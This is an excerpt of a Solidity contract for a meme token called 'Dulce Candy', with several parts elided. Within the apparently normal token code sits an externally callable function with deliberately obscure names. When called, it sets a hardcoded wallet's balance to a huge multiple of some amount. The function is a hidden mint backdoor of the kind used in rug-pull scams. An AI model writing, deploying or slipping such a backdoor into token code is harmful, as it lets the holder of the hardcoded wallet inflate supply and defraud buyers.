...
contract MEMEToken is Ownable {
    ...
    function lindaceoadmin() external {
        ...
        if (_cwojakpepe341!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe341 == tswojaks){
            _balances[_cwojakpepe341] = peedceoAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe341 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Dulce Candy";
    string _symbol = "Dulce";
